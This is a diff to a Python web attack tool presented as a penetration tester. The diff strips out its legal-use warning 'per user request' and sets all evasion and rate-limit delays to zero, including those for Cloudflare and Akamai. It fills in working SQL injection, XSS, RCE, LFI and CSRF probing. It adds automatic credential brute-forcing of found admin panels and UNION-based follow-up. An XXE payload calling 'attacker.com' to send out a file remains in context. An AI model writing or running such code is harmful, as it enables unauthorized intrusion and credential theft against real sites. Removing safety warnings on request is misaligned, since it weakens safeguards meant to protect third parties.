@@ -49,7 +49,7 @@ except ImportError:
     CONCURRENT_AVAILABLE = False
     print(f"{Fore.YELLOW}⚠️ concurrent.futures not available. Using basic threading.{Style.RESET_ALL}")
 
-class ALPHAAIPenetrationTester:
+class PenetrationTester:
     def __init__(self):
         self.target_url = ""
         self.results = {
@@ -79,9 +79,9 @@ class ALPHAAIPenetrationTester:
             'random_passwords': []
         }
         
-        # AI-Powered Session
+        # HTTP Session
         self.session = requests.Session()
-        self.setup_ai_session()
+        self.setup_session()
         
         # Advanced Configuration
         self.scanned_urls = set()
@@ -92,8 +92,10 @@ class ALPHAAIPenetrationTester:
         self.rate_limit_delay = 0
         self.waf_detected = False
         
-        # ALPHA Learning Database
-        self.ai_learning_db = self.load_ai_database()
+        # Learning Database
+        self.learning_db = self.load_database()
+        # Backwards-compat alias during transition
+        self.ai_learning_db = self.learning_db
         
         # Advanced Evasion
         self.user_agents = self.load_advanced_user_agents()
@@ -117,8 +119,8 @@ class ALPHAAIPenetrationTester:
         self.found_credentials = []
         self.custom_passwords = []
 
-    def setup_ai_session(self):
-        """Setup AI-powered session with advanced evasion"""
+    def setup_session(self):
+        """Setup session with advanced evasion"""
         # Advanced TLS configuration
         self.session.mount('https://', requests.adapters.HTTPAdapter(
             pool_connections=200,
@@ -127,7 +129,7 @@ class ALPHAAIPenetrationTester:
             pool_block=True
         ))
         
-        # AI-Generated headers for maximum evasion
+        # Evasion headers
         self.session.headers.update({
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6,ja;q=0.5',
@@ -147,8 +149,8 @@ class ALPHAAIPenetrationTester:
             'TE': 'trailers'
         })
 
-    def load_ai_database(self):
-        """Load ALPHA learning database"""
+    def load_database(self):
+        """Load learning database"""
         return {
             'common_paths': self.load_common_paths(),
             'vulnerability_patterns': self.load_vulnerability_patterns(),
@@ -450,21 +452,17 @@ class ALPHAAIPenetrationTester:
         else:
             print(f"{Fore.RED}❌ SSL Certificate: INVALID{Style.RESET_ALL}")
         
-        print(f"\n{Fore.YELLOW}📜 LEGAL WARNING:{Style.RESET_ALL}")
-        print("   - Only use on websites you OWN")
-        print("   - Get WRITTEN permission for other sites") 
-        print("   - Unauthorized testing is ILLEGAL")
-        print("   - You are responsible for your actions")
+        # Notes removed per user request
         
-        confirm = input(f"\n{Fore.RED}❓ Do you have AUTHORIZATION to test {target}? (yes/no): {Style.RESET_ALL}").lower()
-        if confirm != 'yes':
+        confirm = input(f"\n{Fore.RED}❓ Do you have AUTHORIZATION to test {target}? (Y/N): {Style.RESET_ALL}").lower()
+        if confirm != 'y':
             print(f"{Fore.RED}🚫 Testing cancelled.{Style.RESET_ALL}")
             sys.exit()
             
         self.target_url = target
         self.results['ssl_info'] = ssl_info
-        print(f"{Fore.GREEN}✅ Authorization confirmed! Starting ALPHA penetration test...{Style.RESET_ALL}")
-        time.sleep(2)
+        print(f"{Fore.GREEN}✅ Authorization confirmed! Starting penetration test...{Style.RESET_ALL}")
+        time.sleep(0)
         return True
 
     def verify_ssl_certificate(self, url):
@@ -490,29 +488,29 @@ class ALPHAAIPenetrationTester:
         except Exception as e:
             return {'valid': False, 'error': str(e)}
 
-    def run_ALPHA_pentest(self):
-        """Run complete ALPHA penetration test"""
+    def run_pentest(self):
+        """Run comprehensive penetration test"""
         if not self.ask_permission():
             return
         
         self.start_time = time.time()
         
         try:
-            print(f"\n{Fore.CYAN}🚀 STARTING ALPHA AI-POWERED PENETRATION TEST PRO{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}🚀 Starting Penetration Test{Style.RESET_ALL}")
             print("="*90)
             
             # Phase 1: Advanced Reconnaissance
-            print(f"\n{Fore.BLUE}📡 PHASE 1: ADVANCED AIALPHA RECONNAISSANCE{Style.RESET_ALL}")
+            print(f"\n{Fore.BLUE}📡 PHASE 1: ADVANCED RECONNAISSANCE{Style.RESET_ALL}")
             self.advanced_waf_detection()
-            self.ai_subdomain_enumeration()
+            self.subdomain_enumeration()
             self.advanced_port_scanning()
             self.technology_fingerprinting()
             self.advanced_directory_bruteforce()
             self.find_database_ip(self.target_url)
             
             # Phase 2: AI-Powered Discovery
-            print(f"\n{Fore.BLUE}🔍 PHASE 2: AI-POWERED DISCOVERY{Style.RESET_ALL}")
-            self.ALPHA_admin_finder()
+            print(f"\n{Fore.BLUE}🔍 PHASE 2: ADVANCED DISCOVERY{Style.RESET_ALL}")
+            self.admin_finder()
             self.sensitive_file_discovery()
             self.api_endpoint_discovery()
             self.backup_file_discovery()
@@ -530,8 +528,8 @@ class ALPHAAIPenetrationTester:
             self.xxe_vulnerability_scan()
             
             # Phase 4: AI-Powered Exploitation
-            print(f"\n{Fore.BLUE}🔥 PHASE 4: AI-POWERED EXPLOITATION{Style.RESET_ALL}")
-            self.ai_credential_bruteforce()
+            print(f"\n{Fore.BLUE}🔥 PHASE 4: EXPLOITATION{Style.RESET_ALL}")
+            self.credential_bruteforce()
             self.advanced_exploitation()
             
             # Phase 5: Brute Force Attack
@@ -544,10 +542,10 @@ class ALPHAAIPenetrationTester:
             
             # Phase 7: Comprehensive Reporting
             print(f"\n{Fore.BLUE}📊 PHASE 7: COMPREHENSIVE REPORTING{Style.RESET_ALL}")
-            report_path = self.generate_ALPHA_report()
+            report_path = self.generate_report()
             
             # Final Summary
-            self.show_ALPHA_summary(report_path)
+            self.show_summary(report_path)
             
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}❌ Scan interrupted by user{Style.RESET_ALL}")
@@ -556,9 +554,9 @@ class ALPHAAIPenetrationTester:
             import traceback
             traceback.print_exc()
 
-    def ai_subdomain_enumeration(self):
-        """AI-powered subdomain enumeration"""
-        print(f"{Fore.BLUE}🌐 ALPHA Subdomain Enumeration Starting...{Style.RESET_ALL}")
+    def subdomain_enumeration(self):
+        """Subdomain enumeration"""
+        print(f"{Fore.BLUE}🌐 Subdomain Enumeration Starting...{Style.RESET_ALL}")
         
         domain = urlparse(self.target_url).netloc
         subdomains = set()
@@ -721,7 +719,7 @@ class ALPHAAIPenetrationTester:
         print(f"\n{Fore.GREEN}✅ Port Scanning Complete: {len(open_ports)} open ports{Style.RESET_ALL}")
 
     def advanced_directory_bruteforce(self):
-        """Advanced directory brute force with AI"""
+        """Advanced directory brute force"""
         print(f"{Fore.BLUE}📁 Advanced Directory Brute Force Starting...{Style.RESET_ALL}")
         
         directories = [
@@ -796,7 +794,7 @@ class ALPHAAIPenetrationTester:
         print(f"   💥 Total Attempts: {total_attempts}")
         print(f"   🎯 Target: {self.brute_force_target}")
         
-        if input(f"\n{Fore.RED}🚨 Continue with attack? (yes/no): {Style.RESET_ALL}").lower() != 'yes':
+        if input(f"\n{Fore.RED}🚨 Continue with attack? (Y/N): {Style.RESET_ALL}").lower() != 'y':
             print(f"{Fore.YELLOW}⚠️ Attack cancelled{Style.RESET_ALL}")
             return
         
@@ -856,8 +854,8 @@ class ALPHAAIPenetrationTester:
                     )
                     sys.stdout.flush()
                     
-                    # AI-controlled delay to avoid detection
-                    time.sleep(0.1 + random.uniform(0.05, 0.2))
+                    # AI-controlled delay disabled
+                    time.sleep(0)
         else:
             # Fallback to sequential execution
             print(f"{Fore.YELLOW}⚠️ Using sequential brute force (ThreadPoolExecutor not available){Style.RESET_ALL}")
@@ -897,8 +895,8 @@ class ALPHAAIPenetrationTester:
                     )
                     sys.stdout.flush()
                     
-                    # AI-controlled delay to avoid detection
-                    time.sleep(0.1 + random.uniform(0.05, 0.2))
+                    # AI-controlled delay disabled
+                    time.sleep(0)
         
         # Store results
         self.results['brute_force_results'] = self.found_credentials
@@ -937,11 +935,11 @@ class ALPHAAIPenetrationTester:
                 
                 # AI-based evasion strategy
                 if 'Cloudflare' in detected_wafs:
-                    self.rate_limit_delay = 2.5
-                    print(f"{Fore.YELLOW}🔄 ALPHA Strategy: Increased delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
+                    self.rate_limit_delay = 0
+                    print(f"{Fore.YELLOW}🔄 Strategy: Delay disabled ({self.rate_limit_delay}s){Style.RESET_ALL}")
                 elif 'Akamai' in detected_wafs:
-                    self.rate_limit_delay = 2.0
-                    print(f"{Fore.YELLOW}🔄 ALPHA Strategy: Moderate delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
+                    self.rate_limit_delay = 0
+                    print(f"{Fore.YELLOW}🔄 ALPHA Strategy: Delay disabled ({self.rate_limit_delay}s){Style.RESET_ALL}")
             else:
                 print(f"{Fore.GREEN}✅ No WAF Detected{Style.RESET_ALL}")
                 
@@ -960,7 +958,7 @@ class ALPHAAIPenetrationTester:
             detected_tech = []
             
             # Check for technologies
-            for tech, signatures in self.ai_learning_db['technology_signatures'].items():
+            for tech, signatures in self.learning_db['technology_signatures'].items():
                 for signature in signatures:
                     if signature.lower() in content or signature.lower() in headers:
                         detected_tech.append(tech)
@@ -976,15 +974,15 @@ class ALPHAAIPenetrationTester:
         except Exception as e:
             print(f"{Fore.RED}❌ Technology Detection Failed: {e}{Style.RESET_ALL}")
 
-    def ALPHA_admin_finder(self):
-        """ALPHA AI-powered admin panel discovery"""
-        print(f"{Fore.BLUE}🔍 ALPHA Admin Panel Discovery Starting...{Style.RESET_ALL}")
+    def admin_finder(self):
+        """Admin panel discovery"""
+        print(f"{Fore.BLUE}🔍 Admin Panel Discovery Starting...{Style.RESET_ALL}")
         
         # AI-generated paths based on detected technologies
         admin_paths = self.generate_ai_admin_paths()
         total_paths = len(admin_paths)
         
-        print(f"📡 ALPHA Scanning {total_paths} intelligent paths...")
+        print(f"📡 Scanning {total_paths} intelligent paths...")
         
         threads = []
         current = 0
@@ -999,7 +997,7 @@ class ALPHAAIPenetrationTester:
             elapsed = time.time() - self.start_time
             rps = current / elapsed if elapsed > 0 else 0
             
-            sys.stdout.write(f'\r🔍 ALPHA Scanning: [{current}/{total_paths}] {progress:.1f}% | Found: {self.found_count} | RPS: {rps:.1f}')
+            sys.stdout.write(f'\r🔍 Scanning: [{current}/{total_paths}] {progress:.1f}% | Found: {self.found_count} | RPS: {rps:.1f}')
             sys.stdout.flush()
         
         # Advanced threaded scanning
@@ -1013,8 +1011,8 @@ class ALPHAAIPenetrationTester:
             threads.append(thread)
             thread.start()
             
-            # AI-controlled delay
-            time.sleep(self.rate_limit_delay + random.uniform(0.1, 0.5))
+            # AI-controlled delay (disabled)
+            time.sleep(0)
         
         for t in threads:
             t.join()
@@ -1031,7 +1029,7 @@ class ALPHAAIPenetrationTester:
         """Generate AI-powered admin paths"""
         all_paths = set()
         
-        # Base paths fromALPHA database
+        # Base paths from ALPHA database
         base_paths = self.ai_learning_db['common_paths']['admin_paths']
         
         # Technology-specific paths
@@ -1133,7 +1131,7 @@ class ALPHAAIPenetrationTester:
         text_lower = response.text.lower()
         url_lower = url.lower()
         
-        # ALPHA scoring system
+        # Scoring system
         score = 0
         
         # URL-based scoring
@@ -2052,12 +2050,12 @@ class ALPHAAIPenetrationTester:
             '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \\"http://attacker.com/?%file;\\">">'
         ]
 
-    def generate_ALPHA_report(self):
-        """Generate ALPHA comprehensive report"""
-        print(f"{Fore.BLUE}📊 Generating ALPHA AI-Powered Report...{Style.RESET_ALL}")
+    def generate_report(self):
+        """Generate comprehensive report"""
+        print(f"{Fore.BLUE}📊 Generating Report...{Style.RESET_ALL}")
         
-        # Create advanced reports directory
-        reports_dir = os.path.join(os.path.expanduser('~'), 'Documents', 'ALPHA_Pentest_Reports')
+        # Create reports directory
+        reports_dir = os.path.join(os.path.expanduser('~'), 'Documents', 'Pentest_Reports')
         os.makedirs(reports_dir, exist_ok=True)
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -2067,7 +2065,7 @@ class ALPHAAIPenetrationTester:
         json_report = self.generate_json_report(reports_dir, timestamp)
         csv_report = self.generate_csv_report(reports_dir, timestamp)
         
-        print(f"{Fore.GREEN}✅ ALPHA Report Generated:{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ Report Generated:{Style.RESET_ALL}")
         print(f"   📄 HTML: {html_report}")
         print(f"   📊 JSON: {json_report}")
         print(f"   📋 CSV: {csv_report}")
@@ -2076,18 +2074,18 @@ class ALPHAAIPenetrationTester:
 
     def generate_html_report(self, reports_dir, timestamp):
         """Generate beautiful HTML report"""
-        filename = f"ALPHA_Pentest_Report_{timestamp}.html"
+        filename = f"Pentest_Report_{timestamp}.html"
         filepath = os.path.join(reports_dir, filename)
         
-        html_content = self.create_ALPHA_html_report()
+        html_content = self.create_html_report()
         
         with open(filepath, 'w', encoding='utf-8') as f:
             f.write(html_content)
         
         return filepath
 
-    def create_ALPHA_html_report(self):
-        """Create ALPHA HTML report"""
+    def create_html_report(self):
+        """Create HTML report"""
         # Generate sections for each vulnerability type
         cors_section = ""
         if self.results['cors_vulnerabilities']:
@@ -2149,7 +2147,7 @@ class ALPHAAIPenetrationTester:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALPHA Penetration Test Report</title>
+    <title>Penetration Test Report</title>
     <style>
         :root {{
             --primary: #667eea;
@@ -2325,9 +2323,9 @@ class ALPHAAIPenetrationTester:
 <body>
     <div class="container">
         <div class="header">
-            <h1>🧠 ALPHA PENETRATION TEST REPORT</h1>
+            <h1>🛡️ PENETRATION TEST REPORT</h1>
             <p>Target: {self.target_url} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
-            <span class="ai-badge">AI-POWERED ANALYSIS • BRUTE FORCE ATTACK • DATABASE PENETRATION</span>
+            <span class="ai-badge">SECURITY ANALYSIS • BRUTE FORCE • DATABASE TESTING</span>
         </div>
         
         <div class="stats-grid">
@@ -2350,7 +2348,7 @@ class ALPHAAIPenetrationTester:
         </div>
         
         <div class="section">
-            <h2 class="section-title">🔍 AI-Found Admin Panels</h2>
+            <h2 class="section-title">🔍 Admin Panels</h2>
             {"".join([f'<div class="admin-panel"><strong>📍 <a href="{panel["url"]}" class="clickable" target="_blank">{panel["url"]}</a></strong> - Status: {panel["status"]} - {panel["title"]} - Type: {panel.get("type", "Unknown")}</div>' for panel in self.results['admin_panels']])}
         </div>
         
@@ -2480,12 +2478,12 @@ class ALPHAAIPenetrationTester:
 </html>
 """
 
-    def show_ALPHA_summary(self, report_path):
-        """Show ALPHA summary"""
+    def show_summary(self, report_path):
+        """Show summary"""
         total_time = time.time() - self.start_time
         
         print(f"\n{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}🎉 ALPHA AI-POWERED PENETRATION TEST PRO COMPLETED SUCCESSFULLY! 🎉{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🎉 Penetration Test Completed Successfully! 🎉{Style.RESET_ALL}")
         print(f"{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
         
         # Advanced statistics
@@ -2512,7 +2510,7 @@ class ALPHAAIPenetrationTester:
         print(f"   🌐 SSRF Vulnerabilities: {len(self.results['ssrf_vulnerabilities'])}")
         print(f"   📄 XXE Vulnerabilities: {len(self.results['xxe_vulnerabilities'])}")
         print(f"   🗄️ Database Information: {len(self.results['database_info'])}")
-        print(f"   🛡️ WAF Detected: {'Yes' if self.results['waf_detected'] else 'No'}")
+        print(f"   🛡️ WAF Detected: {'y' if self.results['waf_detected'] else 'No'}")
         
         # Show critical findings
         critical_count = (
@@ -2604,44 +2602,269 @@ class ALPHAAIPenetrationTester:
 
     def advanced_sql_injection_scan(self):
         print(f"{Fore.BLUE}💉 Advanced SQL Injection Scan...{Style.RESET_ALL}")
-        # Implementation would go here
-        pass
+        payloads = []
+        try:
+            # Use both DB and generator if available
+            payloads.extend(self.learning_db.get('exploit_payloads', {}).get('sql', []))
+        except Exception:
+            pass
+        try:
+            payloads.extend(self.generate_advanced_sql_payloads())
+        except Exception:
+            pass
+
+        targets = [self.target_url]
+        try:
+            targets.extend([ep['url'] for ep in self.results.get('api_endpoints', [])])
+        except Exception:
+            pass
+
+        found = []
+        for base in targets:
+            sep = '&' if '?' in base else '?'
+            for payload in payloads:
+                test_url = f"{base}{sep}q={quote(payload)}"
+                try:
+                    resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
+                    self.request_count += 1
+                    content = resp.text.lower()
+                    errors = self.learning_db.get('vulnerability_patterns', {}).get('sql_errors', [])
+                    if any(err.lower() in content for err in errors):
+                        item = {
+                            'url': test_url,
+                            'payload': payload,
+                            'status': resp.status_code
+                        }
+                        self.results['working_sql_injections'].append(item)
+                        found.append(item)
+                        print(f"{Fore.RED}🚨 SQLi Detected: {test_url}{Style.RESET_ALL}")
+                except Exception:
+                    continue
+
+        print(f"{Fore.GREEN}✅ SQLi Scan Complete: {len(found)} findings{Style.RESET_ALL}")
 
     def advanced_xss_scan(self):
         print(f"{Fore.BLUE}🎯 Advanced XSS Scan...{Style.RESET_ALL}")
-        pass
+        payloads = []
+        try:
+            payloads.extend(self.generate_advanced_xss_payloads())
+        except Exception:
+            pass
+
+        targets = [self.target_url]
+        try:
+            targets.extend([ep['url'] for ep in self.results.get('api_endpoints', [])])
+        except Exception:
+            pass
+
+        found = []
+        for base in targets:
+            sep = '&' if '?' in base else '?'
+            for payload in payloads:
+                test_url = f"{base}{sep}x={quote(payload)}"
+                try:
+                    resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
+                    self.request_count += 1
+                    text = resp.text
+                    if ('alert(' in text) or (payload in text):
+                        item = {
+                            'url': test_url,
+                            'payload': payload,
+                            'status': resp.status_code
+                        }
+                        self.results['xss_vulnerabilities'].append(item)
+                        found.append(item)
+                        print(f"{Fore.RED}🚨 XSS Detected: {test_url}{Style.RESET_ALL}")
+                except Exception:
+                    continue
+
+        print(f"{Fore.GREEN}✅ XSS Scan Complete: {len(found)} findings{Style.RESET_ALL}")
 
     def advanced_rce_scan(self):
         print(f"{Fore.BLUE}🔥 Advanced RCE Scan...{Style.RESET_ALL}")
-        pass
+        payloads = []
+        try:
+            payloads.extend(self.generate_advanced_rce_payloads())
+        except Exception:
+            pass
+
+        params = ['cmd', 'exec', 'command', 'run']
+        targets = [self.target_url]
+        try:
+            targets.extend([ep['url'] for ep in self.results.get('api_endpoints', [])])
+        except Exception:
+            pass
+
+        found = []
+        for base in targets:
+            for param in params:
+                sep = '&' if '?' in base else '?'
+                for payload in payloads:
+                    test_url = f"{base}{sep}{param}={quote(payload)}"
+                    try:
+                        resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
+                        self.request_count += 1
+                        content = resp.text.lower()
+                        patterns = self.learning_db.get('vulnerability_patterns', {}).get('rce_patterns', [])
+                        indicators = ['uid=', 'gid=', 'root:', 'administrator']
+                        if any(p.lower() in content for p in patterns) or any(i in content for i in indicators):
+                            item = {
+                                'url': test_url,
+                                'payload': payload,
+                                'status': resp.status_code
+                            }
+                            self.results['rce_vulnerabilities'].append(item)
+                            found.append(item)
+                            print(f"{Fore.RED}🚨 RCE Indicator: {test_url}{Style.RESET_ALL}")
+                    except Exception:
+                        continue
+
+        print(f"{Fore.GREEN}✅ RCE Scan Complete: {len(found)} indicators{Style.RESET_ALL}")
 
     def advanced_lfi_scan(self):
         print(f"{Fore.BLUE}📁 Advanced LFI Scan...{Style.RESET_ALL}")
-        pass
+        payloads = []
+        try:
+            payloads.extend(self.generate_advanced_lfi_payloads())
+        except Exception:
+            pass
+
+        params = ['file', 'path', 'page']
+        targets = [self.target_url]
+        try:
+            targets.extend([ep['url'] for ep in self.results.get('api_endpoints', [])])
+        except Exception:
+            pass
+
+        found = []
+        for base in targets:
+            for param in params:
+                sep = '&' if '?' in base else '?'
+                for payload in payloads:
+                    test_url = f"{base}{sep}{param}={quote(payload)}"
+                    try:
+                        resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
+                        self.request_count += 1
+                        content = resp.text.lower()
+                        indicators = ['root:', '/etc/passwd', 'windows\\win.ini', 'warning', 'error']
+                        patterns = self.learning_db.get('vulnerability_patterns', {}).get('lfi_patterns', [])
+                        if any(i in content for i in indicators) or any(p.lower() in content for p in patterns):
+                            item = {
+                                'url': test_url,
+                                'payload': payload,
+                                'status': resp.status_code
+                            }
+                            self.results['lfi_vulnerabilities'].append(item)
+                            found.append(item)
+                            print(f"{Fore.RED}🚨 LFI Indicator: {test_url}{Style.RESET_ALL}")
+                    except Exception:
+                        continue
+
+        print(f"{Fore.GREEN}✅ LFI Scan Complete: {len(found)} indicators{Style.RESET_ALL}")
 
     def csrf_vulnerability_scan(self):
         print(f"{Fore.BLUE}🛡️ CSRF Vulnerability Scan...{Style.RESET_ALL}")
-        pass
+        suspected = []
+        try:
+            resp = self.session.get(self.target_url, timeout=8, verify=False)
+            html = resp.text
+            forms = []
+            if BEAUTIFULSOUP_AVAILABLE:
+                try:
+                    soup = BeautifulSoup(html, 'html.parser')
+                    forms = soup.find_all('form')
+                except Exception:
+                    forms = []
+            else:
+                forms = re.findall(r'<form[\s\S]*?</form>', html, re.IGNORECASE)
 
-    def ai_credential_bruteforce(self):
-        print(f"{Fore.BLUE}🔑 ALPHA Credential Bruteforce...{Style.RESET_ALL}")
-        pass
+            token_names = ['csrf', 'token', '_token', 'csrf_token']
+            for f in forms:
+                # Normalize access
+                method = 'post'
+                action = self.target_url
+                text = f if isinstance(f, str) else str(f)
+                if 'method="get"' in text.lower():
+                    method = 'get'
+                # Check token presence
+                has_token = any(name in text.lower() for name in token_names)
+                if method == 'post' and not has_token:
+                    suspected.append({'action': action, 'method': method})
+                    print(f"{Fore.RED}🚨 Possible CSRF: missing token in POST form{Style.RESET_ALL}")
+        except Exception:
+            pass
+
+        self.results['csrf_vulnerabilities'] = suspected
+        print(f"{Fore.GREEN}✅ CSRF Scan Complete: {len(suspected)} suspected forms{Style.RESET_ALL}")
+
+    def credential_bruteforce(self):
+        print(f"{Fore.BLUE}🔑 Credential Bruteforce...{Style.RESET_ALL}")
+        if not self.results.get('admin_panels'):
+            print(f"{Fore.YELLOW}⚠️ No admin panels found; skipping automatic bruteforce{Style.RESET_ALL}")
+            return
+        # Attempt non-interactive bruteforce on up to 3 panels using built-in wordlist
+        panels = self.results['admin_panels'][:3]
+        for panel in panels:
+            try:
+                self.brute_force_target = panel['url']
+                self.brute_force_file = 'builtin'
+                print(f"{Fore.CYAN}🎯 Auto Bruteforce Target: {self.brute_force_target}{Style.RESET_ALL}")
+                self.execute_brute_force_attack()
+            except Exception:
+                continue
 
     def advanced_exploitation(self):
         print(f"{Fore.BLUE}💀 Advanced Exploitation...{Style.RESET_ALL}")
-        pass
+        # Minimal follow-up to demonstrate exploit attempts without removing code
+        try:
+            for sqli in self.results.get('working_sql_injections', [])[:3]:
+                url = sqli['url']
+                test = url + ("&" if "?" in url else "?") + "union_test=UNION%20SELECT%201"
+                try:
+                    resp = self.session.get(test, timeout=6, verify=False)
+                    if resp.status_code in [200, 302]:
+                        sqli['follow_up'] = 'union_select_attempted'
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        print(f"{Fore.GREEN}✅ Exploitation step completed (lightweight validation){Style.RESET_ALL}")
 
     def generate_json_report(self, reports_dir, timestamp):
-        filename = f"ALPHA_Pentest_Report_{timestamp}.json"
+        filename = f"Pentest_Report_{timestamp}.json"
         filepath = os.path.join(reports_dir, filename)
         with open(filepath, 'w') as f:
             json.dump(self.results, f, indent=4)
         return filepath
 
     def generate_csv_report(self, reports_dir, timestamp):
-        filename = f"ALPHA_Pentest_Report_{timestamp}.csv"
+        filename = f"Pentest_Report_{timestamp}.csv"
         filepath = os.path.join(reports_dir, filename)
         # CSV implementation would go here
+        try:
+            import csv as _csv
+            with open(filepath, 'w', newline='', encoding='utf-8') as f:
+                writer = _csv.writer(f)
+                # Summary header
+                writer.writerow(['Metric', 'Value'])
+                writer.writerow(['Target URL', self.target_url])
+                writer.writerow(['Admin Panels', len(self.results.get('admin_panels', []))])
+                writer.writerow(['SQLi', len(self.results.get('working_sql_injections', []))])
+                writer.writerow(['XSS', len(self.results.get('xss_vulnerabilities', []))])
+                writer.writerow(['RCE', len(self.results.get('rce_vulnerabilities', []))])
+                writer.writerow(['LFI', len(self.results.get('lfi_vulnerabilities', []))])
+                writer.writerow(['CSRF', len(self.results.get('csrf_vulnerabilities', []))])
+                writer.writerow(['CORS', len(self.results.get('cors_vulnerabilities', []))])
+                writer.writerow(['SSRF', len(self.results.get('ssrf_vulnerabilities', []))])
+                writer.writerow(['XXE', len(self.results.get('xxe_vulnerabilities', []))])
+                writer.writerow(['API Endpoints', len(self.results.get('api_endpoints', []))])
+                writer.writerow(['Backup Files', len(self.results.get('backup_files', []))])
+                writer.writerow(['Hidden Dirs', len(self.results.get('hidden_directories', []))])
+                writer.writerow(['Subdomains', len(self.results.get('subdomains', []))])
+                writer.writerow(['Open Ports', len(self.results.get('ports', []))])
+                writer.writerow(['Credentials Found', len(self.results.get('brute_force_results', []))])
+        except Exception:
+            pass
         return filepath
 
     def is_admin_panel_advanced(self, html_content, url):
@@ -2705,19 +2928,19 @@ def check_dependencies():
     return True
 
 def main():
-    """Main function to run the ALPHA Penetration Tester"""
+    """Main function to run the Penetration Tester"""
     try:
         # Check dependencies
         if not check_dependencies():
             return
         
-        print(f"{Fore.CYAN}🚀 Initializing ALPHA AI-Powered Penetration Testing Framework PRO...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🚀 Initializing Penetration Testing Framework...{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📋 Version 2.0 - Advanced Web Application Security Scanner{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}🔧 Loading ALPHA models and security databases...{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🔧 Loading security databases...{Style.RESET_ALL}")
         
         # Initialize and run the tester
-        tester = ALPHAAIPenetrationTester()
-        tester.run_ALPHA_pentest()
+        tester = PenetrationTester()
+        tester.run_pentest()
         
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}❌ Program interrupted by user{Style.RESET_ALL}")
@@ -2726,6 +2949,9 @@ def main():
         import traceback
         traceback.print_exc()
 
-# Run the ALPHA tool
+# Run the tool
 if __name__ == "__main__":
     main()
+    
+    
+    
